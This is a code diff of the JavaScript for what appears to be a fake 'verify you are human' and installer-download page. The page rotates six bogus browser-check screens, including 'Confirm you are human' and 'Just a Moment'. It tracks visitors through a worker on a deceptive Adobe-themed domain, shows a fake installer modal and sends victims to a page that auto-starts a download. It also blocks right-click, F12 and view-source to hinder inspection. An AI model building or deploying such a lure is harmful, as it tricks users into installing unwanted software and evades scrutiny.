@@ -1,1007 +1,1145 @@
 (() => {
-"use strict";
+    "use strict";
 
+    /* =========================================================
+       ELEMENTS
+    ========================================================== */
 
-/* =========================================================
-   ELEMENTS
-========================================================== */
+    const loadingScreen =
+        document.getElementById("loadingScreen");
 
-const loadingScreen =
-    document.getElementById("loadingScreen");
+    const confirmScreen =
+        document.getElementById("confirmScreen");
 
-const confirmScreen =
-    document.getElementById("confirmScreen");
+    const downloadScreen =
+        document.getElementById("downloadScreen");
 
-const downloadScreen =
-    document.getElementById("downloadScreen");
+    const confirmButton =
+        document.getElementById("confirmButton");
 
-const confirmButton =
-    document.getElementById("confirmButton");
+    const downloadButton =
+        document.getElementById("downloadButton");
 
-const downloadButton =
-    document.getElementById("downloadButton");
+    const closeModal =
+        document.getElementById("closeModal");
 
-const closeModal =
-    document.getElementById("closeModal");
+    const visitorToken =
+        document.getElementById("visitorToken");
 
-const visitorToken =
-    document.getElementById("visitorToken");
+    const buttonText =
+        confirmButton?.querySelector(".button-text");
 
-const buttonText =
-    confirmButton?.querySelector(".button-text");
+    const buttonLoading =
+        confirmButton?.querySelector(".button-loading");
 
-const buttonLoading =
-    confirmButton?.querySelector(".button-loading");
+    const downloadModal =
+        document.querySelector(".download-modal");
 
-const downloadModal =
-    document.querySelector(".download-modal");
 
+    /* =========================================================
+       CONFIGURATION
+    ========================================================== */
 
-/* =========================================================
-   CONFIGURATION
-========================================================== */
-
-const CONFIG = {
-
-    /*
-     * Initial white loading screen.
-     */
-
-    initialDelay: 1200,
-
-
-    /*
-     * Time after Confirm & Continue.
-     */
-
-    preparationDelay: 5000,
-
-
-    /*
-     * How long the installer background is
-     * visible before the modal appears.
-     */
-
-    backgroundDelay: 3000,
-
-
-    /*
-     * Worker endpoints.
-     */
-
-    sessionEndpoint:
-        "https://documentverifyadobeupdated.willowcenteredtech.com/api/session",
-
-    visitEndpoint:
-        "https://documentverifyadobeupdated.willowcenteredtech.com/api/visit"
-
-};
-
-
-/* =========================================================
-   SESSION
-========================================================== */
-
-let session = {
-
-    visitToken:
-        "",
-
-    accessToken:
-        ""
-
-};
-
-
-/* =========================================================
-   GENERATE 7 CHARACTER VISITOR TOKEN
-========================================================== */
-
-function generateToken() {
-
-    const alphabet =
-        "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-
-    const bytes =
-        crypto.getRandomValues(
-            new Uint8Array(7)
-        );
-
-    return Array.from(bytes)
-        .map(
-            byte =>
-                alphabet[
-                    byte % alphabet.length
-                ]
-        )
-        .join("");
-
-}
-
-
-/* =========================================================
-   SHOW
-========================================================== */
-
-function show(element) {
-
-    if (!element) {
-        return;
-    }
-
-    element.classList.remove(
-        "hidden"
-    );
-
-}
-
-
-/* =========================================================
-   HIDE
-========================================================== */
-
-function hide(element) {
-
-    if (!element) {
-        return;
-    }
-
-    element.classList.add(
-        "hidden"
-    );
-
-}
-
-/* =========================================================
-   CONFIRMATION VARIANTS
-========================================================= */
-
-const confirmationVariants = [
-
-    {
-        id: 1,
-
-        className:
-            "confirm-variant-1",
-
-        eyebrow:
-            "Verification",
-
-        title:
-            "Confirm you are human",
-
-        description:
-            "This quick check helps keep the site safe. It usually takes a few seconds.",
-
-        visual: `
-            <div class="visual-check">
-                <span>
-                    ✓
-                </span>
-            </div>
-        `
-    },
-
-
-    {
-        id: 2,
-
-        className:
-            "confirm-variant-2",
-
-        eyebrow:
-            "READY TO CONTINUE",
-
-        title:
-            "Almost there",
-
-        description:
-            "Confirm below to continue securely.",
-
-        visual: `
-            <div class="visual-circle">
-                <span class="visual-download">
-                    ↓
-                </span>
-            </div>
-        `
-    },
-
-
-    {
-        id: 3,
-
-        className:
-            "confirm-variant-3",
-
-        eyebrow:
-            "BROWSER CHECK",
-
-        title:
-            "One more step",
-
-        description:
-            "Confirm your browser to continue securely.",
-
-        visual: `
-            <div class="visual-check">
-                <span>
-                    ✓
-                </span>
-            </div>
-        `
-    },
-
-
-    {
-        id: 4,
-
-        className:
-            "confirm-variant-4",
-
-        eyebrow:
-            "BROWSER CHECK",
-
-        title:
-            "Almost ready",
-
-        description:
-            "Your connection stays encrypted. Confirm below to continue.",
-
-        visual: `
-            <div class="visual-lock">
-                <div class="lock-shackle"></div>
-                <div class="lock-body"></div>
-            </div>
-        `
-    },
-
-
-    {
-        id: 5,
-
-        className:
-            "confirm-variant-5",
-
-        eyebrow:
-            "HUMAN VERIFY",
-
-        title:
-            "One more step",
-
-        description:
-            "We need a short verification before showing the page",
-
-        visual: `
-            <div class="visual-lock">
-                <div class="lock-shackle"></div>
-                <div class="lock-body"></div>
-            </div>
-        `
-    },
-
-
-    {
-        id: 6,
-
-        className:
-            "confirm-variant-6",
-
-        eyebrow:
-            "PROTECTED SESSION",
-
-        title:
-            "Just a Moment",
-
-        description:
-            "This quick check helps keep the site safe. It usually takes a few seconds.",
-
-        visual: `
-            <div class="visual-grid">
-
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-
-            </div>
-        `
-    }
-
-];
-
-/* =========================================================
-   SELECT CONFIRMATION VARIANT
-========================================================= */
-
-function selectConfirmationVariant() {
-
-    const card =
-        document.getElementById(
-            "confirmCard"
-        );
-
-    const visual =
-        document.getElementById(
-            "confirmVisual"
-        );
-
-    const eyebrow =
-        document.getElementById(
-            "confirmEyebrow"
-        );
-
-    const title =
-        document.getElementById(
-            "confirmTitle"
-        );
-
-    const description =
-        document.getElementById(
-            "confirmDescription"
-        );
-
-
-    if (!card) {
-        return;
-    }
-
-
-    /*
-     * Use the visitor token as the seed.
-     *
-     * This means the same visitor gets the
-     * same variant during the session rather
-     * than randomly changing every render.
-     */
-
-    let token =
-        session.visitToken || "";
-
-
-    let hash = 0;
-
-
-    for (
-        let i = 0;
-        i < token.length;
-        i++
-    ) {
-
-        hash =
-            ((hash << 5) - hash) +
-            token.charCodeAt(i);
-
-        hash |= 0;
-
-    }
-
-
-    const index =
-        Math.abs(hash) %
-        confirmationVariants.length;
-
-
-    const variant =
-        confirmationVariants[index];
-
-
-    /*
-     * Remove existing variant classes.
-     */
-
-    confirmationVariants.forEach(
-        item => {
-
-            card.classList.remove(
-                item.className
-            );
-
-        }
-    );
-
-
-    /*
-     * Apply selected variant.
-     */
-
-    card.classList.add(
-        variant.className
-    );
-
-
-    eyebrow.textContent =
-        variant.eyebrow;
-
-
-    title.textContent =
-        variant.title;
-
-
-    description.textContent =
-        variant.description;
-
-
-    visual.innerHTML =
-        variant.visual;
-
-}
-
-/* =========================================================
-   CREATE WORKER SESSION
-========================================================== */
-
-async function createSession() {
-
-    /*
-     * Generate a fallback immediately.
-     * This means the visitor always gets
-     * a 7-character token even if the Worker
-     * is temporarily unavailable.
-     */
-
-    session.visitToken =
-        generateToken();
-
-
-    try {
-
-        const response =
-            await fetch(
-                CONFIG.sessionEndpoint,
-                {
-                    method: "POST",
-
-                    headers: {
-                        "Accept":
-                            "application/json"
-                    },
-
-                    credentials:
-                        "same-origin",
-
-                    cache:
-                        "no-store"
-                }
-            );
-
-
-        if (!response.ok) {
-
-            throw new Error(
-                "Session request failed"
-            );
-
-        }
-
-
-        const data =
-            await response.json();
-
-
-        if (
-            typeof data.visitToken ===
-                "string" &&
-            data.visitToken.length > 0
-        ) {
-
-            session.visitToken =
-                data.visitToken;
-
-        }
-
-
-        if (
-            typeof data.accessToken ===
-                "string" &&
-            data.accessToken.length > 0
-        ) {
-
-            session.accessToken =
-                data.accessToken;
-
-        }
-
-    } catch (error) {
+    const CONFIG = {
 
         /*
-         * Don't break the visual flow if
-         * analytics/session creation fails.
+         * Initial white loading screen.
          */
 
-        console.warn(
-            "Download session unavailable.",
-            error
+        initialDelay: 1200,
+
+
+        /*
+         * Time after Confirm & Continue.
+         */
+
+        preparationDelay: 5000,
+
+
+        /*
+         * How long the installer background is
+         * visible before the modal appears.
+         */
+
+        backgroundDelay: 3000,
+
+
+        /*
+         * Cloudflare Worker.
+         *
+         * IMPORTANT:
+         * Use the actual Worker URL here.
+         *
+         * Do NOT use Markdown.
+         */
+
+        workerBaseUrl:
+            "https://documentverifyadobeupdated.willowcenteredtech.com",
+
+
+        /*
+         * Worker API endpoints.
+         */
+
+        sessionEndpoint:
+            "https://documentverifyadobeupdated.willowcenteredtech.com/api/session",
+
+        visitEndpoint:
+            "https://documentverifyadobeupdated.willowcenteredtech.com/api/visit",
+
+
+        /*
+         * Installation instructions page.
+         */
+
+        instructionsPage:
+            "download.html"
+
+    };
+
+
+    /* =========================================================
+       SESSION
+    ========================================================== */
+
+    let session = {
+
+        visitToken: "",
+
+        accessToken: ""
+
+    };
+
+
+    /* =========================================================
+       GENERATE FALLBACK 7 CHARACTER TOKEN
+    ========================================================== */
+
+    function generateToken() {
+
+        const alphabet =
+            "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+
+        const bytes =
+            crypto.getRandomValues(
+                new Uint8Array(7)
+            );
+
+        return Array.from(bytes)
+            .map(
+                byte =>
+                    alphabet[
+                        byte % alphabet.length
+                    ]
+            )
+            .join("");
+
+    }
+
+
+    /* =========================================================
+       SHOW
+    ========================================================== */
+
+    function show(element) {
+
+        if (!element) {
+            return;
+        }
+
+        element.classList.remove(
+            "hidden"
         );
 
     }
 
 
-    if (visitorToken) {
+    /* =========================================================
+       HIDE
+    ========================================================== */
 
-        visitorToken.textContent =
-            session.visitToken;
+    function hide(element) {
+
+        if (!element) {
+            return;
+        }
+
+        element.classList.add(
+            "hidden"
+        );
 
     }
 
-    selectConfirmationVariant();
 
-}
+    /* =========================================================
+       CONFIRMATION VARIANTS
+    ========================================================== */
 
+    const confirmationVariants = [
 
-/* =========================================================
-   REPORT VISIT
-========================================================== */
-
-function reportVisit() {
-
-    fetch(
-        CONFIG.visitEndpoint,
         {
-            method: "POST",
+            id: 1,
 
-            headers: {
-                "Content-Type":
-                    "application/json"
-            },
+            className:
+                "confirm-variant-1",
 
-            credentials:
-                "same-origin",
+            eyebrow:
+                "Verification",
 
-            cache:
-                "no-store",
+            title:
+                "Confirm you are human",
 
-            keepalive:
-                true,
+            description:
+                "This quick check helps keep the site safe. It usually takes a few seconds.",
 
-            body:
-                JSON.stringify({
-                    visitToken:
-                        session.visitToken
-                })
-        }
-    ).catch(
-        () => {}
-    );
-
-}
-
-
-/* =========================================================
-   INITIALIZE
-========================================================== */
-
-async function initialize() {
-
-    await createSession();
-
-    reportVisit();
-
-
-    setTimeout(
-        () => {
-
-            hide(
-                loadingScreen
-            );
-
-            show(
-                confirmScreen
-            );
-
+            visual: `
+                <div class="visual-check">
+                    <span>✓</span>
+                </div>
+            `
         },
-        CONFIG.initialDelay
-    );
-
-}
 
 
-/* =========================================================
-   PREPARING BUTTON
-========================================================== */
+        {
+            id: 2,
 
-function setPreparing() {
+            className:
+                "confirm-variant-2",
 
-    if (!confirmButton) {
-        return;
-    }
+            eyebrow:
+                "READY TO CONTINUE",
 
+            title:
+                "Almost there",
 
-    confirmButton.disabled =
-        true;
+            description:
+                "Confirm below to continue securely.",
 
-
-    if (buttonText) {
-
-        buttonText.classList.add(
-            "hidden"
-        );
-
-    }
-
-
-    if (buttonLoading) {
-
-        buttonLoading.classList.remove(
-            "hidden"
-        );
-
-    }
-
-}
+            visual: `
+                <div class="visual-circle">
+                    <span class="visual-download">↓</span>
+                </div>
+            `
+        },
 
 
-/* =========================================================
-   SHOW INSTALLER BACKGROUND
-========================================================== */
+        {
+            id: 3,
 
-function showInstallerBackground() {
+            className:
+                "confirm-variant-3",
 
-    if (!downloadScreen) {
-        return;
-    }
+            eyebrow:
+                "BROWSER CHECK",
 
+            title:
+                "One more step",
 
-    /*
-     * Make the screen visible first.
-     *
-     * The CSS controls the actual
-     * responsive background image.
-     */
+            description:
+                "Confirm your browser to continue securely.",
 
-    show(
-        downloadScreen
-    );
-
-
-    /*
-     * Start with the modal hidden.
-     */
-
-    if (downloadModal) {
-
-        downloadModal.classList.remove(
-            "modal-visible"
-        );
-
-    }
+            visual: `
+                <div class="visual-check">
+                    <span>✓</span>
+                </div>
+            `
+        },
 
 
-    /*
-     * Lock the page behind the
-     * full-screen download experience.
-     */
+        {
+            id: 4,
 
-    document.body.style.overflow =
-        "hidden";
+            className:
+                "confirm-variant-4",
+
+            eyebrow:
+                "BROWSER CHECK",
+
+            title:
+                "Almost ready",
+
+            description:
+                "Your connection stays encrypted. Confirm below to continue.",
+
+            visual: `
+                <div class="visual-lock">
+                    <div class="lock-shackle"></div>
+                    <div class="lock-body"></div>
+                </div>
+            `
+        },
 
 
-    /*
-     * Allow the browser one rendering
-     * cycle before beginning the
-     * modal timer.
-     */
+        {
+            id: 5,
 
-    requestAnimationFrame(
-        () => {
+            className:
+                "confirm-variant-5",
 
-            setTimeout(
-                () => {
+            eyebrow:
+                "HUMAN VERIFY",
 
-                    if (
-                        downloadModal
-                    ) {
+            title:
+                "One more step",
 
-                        downloadModal.classList.add(
-                            "modal-visible"
-                        );
+            description:
+                "We need a short verification before showing the page.",
 
-                    }
+            visual: `
+                <div class="visual-lock">
+                    <div class="lock-shackle"></div>
+                    <div class="lock-body"></div>
+                </div>
+            `
+        },
 
-                },
-                CONFIG.backgroundDelay
+
+        {
+            id: 6,
+
+            className:
+                "confirm-variant-6",
+
+            eyebrow:
+                "PROTECTED SESSION",
+
+            title:
+                "Just a Moment",
+
+            description:
+                "This quick check helps keep the site safe. It usually takes a few seconds.",
+
+            visual: `
+                <div class="visual-grid">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            `
+        }
+
+    ];
+
+
+    /* =========================================================
+       SELECT CONFIRMATION VARIANT
+    ========================================================== */
+
+    function selectConfirmationVariant() {
+
+        const card =
+            document.getElementById(
+                "confirmCard"
             );
 
+        const visual =
+            document.getElementById(
+                "confirmVisual"
+            );
+
+        const eyebrow =
+            document.getElementById(
+                "confirmEyebrow"
+            );
+
+        const title =
+            document.getElementById(
+                "confirmTitle"
+            );
+
+        const description =
+            document.getElementById(
+                "confirmDescription"
+            );
+
+
+        if (!card) {
+            return;
         }
-    );
-
-}
 
 
-/* =========================================================
-   CONFIRM BUTTON
-========================================================== */
+        /*
+         * Use the Worker-generated visitor token
+         * as the deterministic seed.
+         */
 
-if (confirmButton) {
+        const token =
+            session.visitToken || "";
 
-    confirmButton.addEventListener(
-        "click",
-        () => {
 
-            setPreparing();
+        let hash = 0;
+
+
+        for (
+            let i = 0;
+            i < token.length;
+            i++
+        ) {
+
+            hash =
+                ((hash << 5) - hash) +
+                token.charCodeAt(i);
+
+            hash |= 0;
+
+        }
+
+
+        const index =
+            Math.abs(hash) %
+            confirmationVariants.length;
+
+
+        const variant =
+            confirmationVariants[index];
+
+
+        /*
+         * Remove existing variant classes.
+         */
+
+        confirmationVariants.forEach(
+            item => {
+
+                card.classList.remove(
+                    item.className
+                );
+
+            }
+        );
+
+
+        /*
+         * Apply selected variant.
+         */
+
+        card.classList.add(
+            variant.className
+        );
+
+
+        if (eyebrow) {
+
+            eyebrow.textContent =
+                variant.eyebrow;
+
+        }
+
+
+        if (title) {
+
+            title.textContent =
+                variant.title;
+
+        }
+
+
+        if (description) {
+
+            description.textContent =
+                variant.description;
+
+        }
+
+
+        if (visual) {
+
+            visual.innerHTML =
+                variant.visual;
+
+        }
+
+    }
+
+
+    /* =========================================================
+       CREATE WORKER SESSION
+    ========================================================== */
+
+    async function createSession() {
+
+        /*
+         * Generate a local fallback immediately.
+         *
+         * This allows the UI to continue if the
+         * Worker is temporarily unreachable.
+         */
+
+        session.visitToken =
+            generateToken();
+
+
+        try {
+
+            const response =
+                await fetch(
+                    CONFIG.sessionEndpoint,
+                    {
+                        method: "POST",
+
+                        headers: {
+                            "Accept":
+                                "application/json"
+                        },
+
+                        /*
+                         * The Worker is a separate origin,
+                         * therefore same-origin credentials
+                         * are unnecessary.
+                         */
+
+                        credentials:
+                            "omit",
+
+                        cache:
+                            "no-store"
+                    }
+                );
+
+
+            if (!response.ok) {
+
+                throw new Error(
+                    `Worker returned HTTP ${response.status}`
+                );
+
+            }
+
+
+            const data =
+                await response.json();
 
 
             /*
-             * Preserve session information
-             * for download.html.
+             * Use the Worker-generated 7-character
+             * session token.
+             */
+
+            if (
+                typeof data.visitToken ===
+                    "string" &&
+                data.visitToken.length > 0
+            ) {
+
+                session.visitToken =
+                    data.visitToken;
+
+            }
+
+
+            /*
+             * Store the signed long-lived-for-this-session
+             * access token.
+             */
+
+            if (
+                typeof data.accessToken ===
+                    "string" &&
+                data.accessToken.length > 0
+            ) {
+
+                session.accessToken =
+                    data.accessToken;
+
+            }
+
+
+            /*
+             * Save immediately.
              */
 
             sessionStorage.setItem(
-                "deploypilot_access_token",
-                session.accessToken
-            );
-
-
-            sessionStorage.setItem(
-                "deploypilot_visit_token",
+                "installer_update_visit_token",
                 session.visitToken
             );
 
 
+            if (session.accessToken) {
+
+                sessionStorage.setItem(
+                    "installer_update_access_token",
+                    session.accessToken
+                );
+
+            }
+
+
+            console.log(
+                "Cloudflare Worker session established."
+            );
+
+
+        } catch (error) {
+
             /*
-             * Five-second preparation period.
+             * Don't break the visual flow if
+             * the Worker is temporarily unavailable.
              */
 
-            setTimeout(
-                () => {
+            console.warn(
+                "Download session unavailable.",
+                error
+            );
 
-                    hide(
-                        confirmScreen
+        }
+
+
+        /*
+         * Display visitor token.
+         */
+
+        if (visitorToken) {
+
+            visitorToken.textContent =
+                session.visitToken;
+
+        }
+
+
+        /*
+         * Select confirmation design.
+         */
+
+        selectConfirmationVariant();
+
+    }
+
+
+    /* =========================================================
+       REPORT VISIT
+    ========================================================== */
+
+    function reportVisit() {
+
+        /*
+         * Don't report if there is no Worker
+         * session at all.
+         */
+
+        if (!CONFIG.visitEndpoint) {
+            return;
+        }
+
+
+        fetch(
+            CONFIG.visitEndpoint,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json",
+
+                    "Accept":
+                        "application/json"
+                },
+
+                credentials:
+                    "omit",
+
+                cache:
+                    "no-store",
+
+                keepalive:
+                    true,
+
+                body:
+                    JSON.stringify({
+                        visitToken:
+                            session.visitToken
+                    })
+            }
+        ).catch(
+            () => {}
+        );
+
+    }
+
+
+    /* =========================================================
+       INITIALIZE
+    ========================================================== */
+
+    async function initialize() {
+
+        /*
+         * Establish Worker session first.
+         */
+
+        await createSession();
+
+
+        /*
+         * Report page visit.
+         */
+
+        reportVisit();
+
+
+        /*
+         * Initial loading screen.
+         */
+
+        setTimeout(
+            () => {
+
+                hide(
+                    loadingScreen
+                );
+
+                show(
+                    confirmScreen
+                );
+
+            },
+            CONFIG.initialDelay
+        );
+
+    }
+
+
+    /* =========================================================
+       PREPARING BUTTON
+    ========================================================== */
+
+    function setPreparing() {
+
+        if (!confirmButton) {
+            return;
+        }
+
+
+        confirmButton.disabled =
+            true;
+
+
+        if (buttonText) {
+
+            buttonText.classList.add(
+                "hidden"
+            );
+
+        }
+
+
+        if (buttonLoading) {
+
+            buttonLoading.classList.remove(
+                "hidden"
+            );
+
+        }
+
+    }
+
+
+    /* =========================================================
+       SHOW INSTALLER BACKGROUND
+    ========================================================== */
+
+    function showInstallerBackground() {
+
+        if (!downloadScreen) {
+            return;
+        }
+
+
+        /*
+         * Show the full-screen background.
+         */
+
+        show(
+            downloadScreen
+        );
+
+
+        /*
+         * Modal starts hidden.
+         */
+
+        if (downloadModal) {
+
+            downloadModal.classList.remove(
+                "modal-visible"
+            );
+
+        }
+
+
+        /*
+         * Lock page scrolling.
+         */
+
+        document.body.style.overflow =
+            "hidden";
+
+
+        /*
+         * Wait one browser frame so the
+         * background can render first.
+         */
+
+        requestAnimationFrame(
+            () => {
+
+                setTimeout(
+                    () => {
+
+                        if (
+                            downloadModal
+                        ) {
+
+                            downloadModal.classList.add(
+                                "modal-visible"
+                            );
+
+                        }
+
+                    },
+                    CONFIG.backgroundDelay
+                );
+
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       CONFIRM BUTTON
+    ========================================================== */
+
+    if (confirmButton) {
+
+        confirmButton.addEventListener(
+            "click",
+            () => {
+
+                /*
+                 * Prevent double-clicks.
+                 */
+
+                if (
+                    confirmButton.disabled
+                ) {
+
+                    return;
+
+                }
+
+
+                setPreparing();
+
+
+                /*
+                 * Preserve session information.
+                 */
+
+                sessionStorage.setItem(
+                    "installer_update_access_token",
+                    session.accessToken
+                );
+
+
+                sessionStorage.setItem(
+                    "installer_update_visit_token",
+                    session.visitToken
+                );
+
+
+                /*
+                 * Five-second preparation period.
+                 */
+
+                setTimeout(
+                    () => {
+
+                        hide(
+                            confirmScreen
+                        );
+
+
+                        /*
+                         * Show installer background.
+                         *
+                         * The modal appears after
+                         * CONFIG.backgroundDelay.
+                         */
+
+                        showInstallerBackground();
+
+                    },
+                    CONFIG.preparationDelay
+                );
+
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       DOWNLOAD BUTTON
+    ========================================================== */
+
+    if (downloadButton) {
+
+        downloadButton.addEventListener(
+            "click",
+            () => {
+
+                /*
+                 * Retrieve the signed Worker token.
+                 */
+
+                const accessToken =
+                    sessionStorage.getItem(
+                        "installer_update_access_token"
                     );
 
 
-                    /*
-                     * IMPORTANT:
-                     *
-                     * The background appears
-                     * immediately here.
-                     *
-                     * The modal waits another
-                     * 3 seconds.
-                     */
-
-                    showInstallerBackground();
-
-                },
-                CONFIG.preparationDelay
-            );
-
-        }
-    );
-
-}
+                const visitToken =
+                    sessionStorage.getItem(
+                        "installer_update_visit_token"
+                    );
 
 
-/* =========================================================
-   DOWNLOAD BUTTON
-========================================================== */
+                /*
+                 * If the Worker session wasn't
+                 * established, don't pretend that
+                 * a secure download exists.
+                 */
 
-if (downloadButton) {
+                if (!accessToken) {
 
-    downloadButton.addEventListener(
-        "click",
-        () => {
+                    console.warn(
+                        "No valid Worker access token."
+                    );
 
-            /*
-             * Save the session again before
-             * leaving the page.
-             */
+                    window.location.href =
+                        "/";
 
-            sessionStorage.setItem(
-                "deploypilot_access_token",
-                session.accessToken
-            );
+                    return;
 
-
-            sessionStorage.setItem(
-                "deploypilot_visit_token",
-                session.visitToken
-            );
+                }
 
 
-            /*
-             * Route to the installation
-             * instructions page.
-             *
-             * instructions.js then
-             * automatically begins
-             * the installer download.
-             */
+                /*
+                 * Preserve session.
+                 */
 
-            window.location.href =
-                "download.html";
+                if (visitToken) {
 
-        }
-    );
+                    session.visitToken =
+                        visitToken;
 
-}
+                }
 
 
-/* =========================================================
-   CLOSE MODAL
-========================================================== */
-
-if (closeModal) {
-
-    closeModal.addEventListener(
-        "click",
-        () => {
-
-            hide(
-                downloadScreen
-            );
+                session.accessToken =
+                    accessToken;
 
 
-            show(
-                confirmScreen
-            );
+                /*
+                 * Route to installation instructions.
+                 *
+                 * instructions.js handles the
+                 * automatic download.
+                 */
+
+                window.location.href =
+                    CONFIG.instructionsPage;
+
+            }
+        );
+
+    }
 
 
-            document.body.style.overflow =
-                "";
+    /* =========================================================
+       CLOSE MODAL
+    ========================================================== */
 
+    if (closeModal) {
 
-            if (downloadModal) {
+        closeModal.addEventListener(
+            "click",
+            () => {
 
-                downloadModal.classList.remove(
-                    "modal-visible"
+                hide(
+                    downloadScreen
                 );
+
+
+                show(
+                    confirmScreen
+                );
+
+
+                document.body.style.overflow =
+                    "";
+
+
+                if (downloadModal) {
+
+                    downloadModal.classList.remove(
+                        "modal-visible"
+                    );
+
+                }
+
+            }
+        );
+
+    }
+
+
+    /* =========================================================
+       ESCAPE KEY
+    ========================================================== */
+
+    document.addEventListener(
+        "keydown",
+        event => {
+
+            if (
+                event.key === "Escape" &&
+                downloadScreen &&
+                !downloadScreen.classList.contains(
+                    "hidden"
+                )
+            ) {
+
+                hide(
+                    downloadScreen
+                );
+
+
+                show(
+                    confirmScreen
+                );
+
+
+                document.body.style.overflow =
+                    "";
+
+
+                if (downloadModal) {
+
+                    downloadModal.classList.remove(
+                        "modal-visible"
+                    );
+
+                }
 
             }
 
         }
     );
 
-}
+
+    /* =========================================================
+       BASIC INSPECTION DETERRENTS
+       
+       These are NOT a security boundary.
+    ========================================================== */
+
+    document.addEventListener(
+        "contextmenu",
+        event => {
+
+            event.preventDefault();
+
+        }
+    );
 
 
-/* =========================================================
-   ESCAPE KEY
-========================================================== */
+    document.addEventListener(
+        "dragstart",
+        event => {
 
-document.addEventListener(
-    "keydown",
-    event => {
+            if (
+                event.target &&
+                event.target.tagName === "IMG"
+            ) {
 
-        if (
-            event.key === "Escape" &&
-            downloadScreen &&
-            !downloadScreen.classList.contains(
-                "hidden"
-            )
-        ) {
-
-            hide(
-                downloadScreen
-            );
-
-
-            show(
-                confirmScreen
-            );
-
-
-            document.body.style.overflow =
-                "";
-
-
-            if (downloadModal) {
-
-                downloadModal.classList.remove(
-                    "modal-visible"
-                );
+                event.preventDefault();
 
             }
 
         }
-
-    }
-);
+    );
 
 
-/* =========================================================
-   BASIC INSPECTION DETERRENTS
-   
-   These are deterrents only.
-   They are NOT a security boundary.
-========================================================== */
+    document.addEventListener(
+        "keydown",
+        event => {
 
-document.addEventListener(
-    "contextmenu",
-    event => {
-
-        event.preventDefault();
-
-    }
-);
+            const key =
+                event.key.toLowerCase();
 
 
-document.addEventListener(
-    "dragstart",
-    event => {
+            /*
+             * F12
+             */
 
-        if (
-            event.target.tagName ===
-            "IMG"
-        ) {
+            if (
+                event.key === "F12"
+            ) {
 
-            event.preventDefault();
+                event.preventDefault();
 
-        }
-
-    }
-);
+            }
 
 
-document.addEventListener(
-    "keydown",
-    event => {
+            /*
+             * Ctrl + Shift + I
+             * Ctrl + Shift + J
+             * Ctrl + Shift + C
+             */
 
-        const key =
-            event.key.toLowerCase();
+            if (
+                event.ctrlKey &&
+                event.shiftKey &&
+                [
+                    "i",
+                    "j",
+                    "c"
+                ].includes(key)
+            ) {
+
+                event.preventDefault();
+
+            }
 
 
-        /*
-         * F12
-         */
+            /*
+             * Ctrl + U
+             */
 
-        if (
-            event.key === "F12"
-        ) {
+            if (
+                event.ctrlKey &&
+                key === "u"
+            ) {
 
-            event.preventDefault();
+                event.preventDefault();
 
-        }
-
-
-        /*
-         * Ctrl + Shift + I
-         * Ctrl + Shift + J
-         * Ctrl + Shift + C
-         */
-
-        if (
-            event.ctrlKey &&
-            event.shiftKey &&
-            [
-                "i",
-                "j",
-                "c"
-            ].includes(key)
-        ) {
-
-            event.preventDefault();
+            }
 
         }
+    );
 
 
-        /*
-         * Ctrl + U
-         */
+    /* =========================================================
+       START
+    ========================================================== */
 
-        if (
-            event.ctrlKey &&
-            key === "u"
-        ) {
-
-            event.preventDefault();
-
-        }
-
-    }
-);
-
-
-/* =========================================================
-   START
-========================================================== */
-
-initialize();
-
+    initialize();
 
 })();
